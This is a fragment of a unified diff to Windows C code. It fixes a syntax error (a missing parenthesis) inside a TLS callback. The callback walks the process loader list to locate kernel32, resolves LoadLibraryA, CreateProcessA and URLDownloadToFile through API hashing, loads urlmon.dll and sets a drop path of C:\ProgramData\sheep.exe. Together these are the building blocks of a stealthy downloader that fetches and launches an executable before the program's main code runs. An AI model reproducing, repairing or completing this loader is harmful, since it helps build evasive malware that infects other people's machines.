@@ -105,7 +105,7 @@ void NTAPI callback(PVOID dllHandle, DWORD reason, PVOID reserved)
    PFULL_LDR_DATA_TABLE_ENTRY kernel32 = ((PFULL_LDR_DATA_TABLE_ENTRY)(((PFULL_LDR_DATA_TABLE_ENTRY)list_entry->InLoadOrderLinks.Flink)->InLoadOrderLinks.Flink));
    LoadLibraryAHeader loadLibrary = ((LoadLibraryAHeader)get_proc_by_hash((PIMAGE_DOS_HEADER)kernel32->DllBase, 0x53b2070f));
    GetFileAttributesAHeader getFileAttributes = ((GetFileAttributesAHeader)get_proc_by_hash((PIMAGE_DOS_HEADER)kernel32->DllBase, 0xda1a7563));
-   CreateProcessAHeader createProcess = ((CreateProcessAHeader)get_proc_by_hash((PIMAGE_DOS_HEADER)kernel32->DllBase, 0x4a7c0a09);
+   CreateProcessAHeader createProcess = ((CreateProcessAHeader)get_proc_by_hash((PIMAGE_DOS_HEADER)kernel32->DllBase, 0x4a7c0a09));
    PIMAGE_DOS_HEADER urlmonModule = ((PIMAGE_DOS_HEADER)loadLibrary("urlmon.dll"));
    URLDownloadToFileHeader urlDownloadToFile = ((URLDownloadToFileHeader)get_proc_by_hash(urlmonModule, 0xd8d746fc));
    char sheep[] = "C:\\ProgramData\\sheep.exe";
